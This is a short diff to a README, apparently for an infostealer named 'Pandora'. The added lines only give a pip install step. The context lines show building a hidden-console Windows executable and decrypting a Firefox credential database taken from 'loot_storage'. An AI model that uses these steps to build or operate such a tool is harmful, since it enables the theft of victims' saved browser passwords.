@@ -126,3 +126,10 @@ python -m PyInstaller --noconsole --onefile --icon=ICON.ico --name "Pandora Clie
 5.1. ​Extract the .db file and the .key file from the received ZIP in loot_storage.
 
 ​5.2. Run: ```python firefox_decrypt.py```
+
+## 6. Install from requirements.txt
+
+6.1. Install requirements:
+```text
+pip install -r requirements.txt
+```
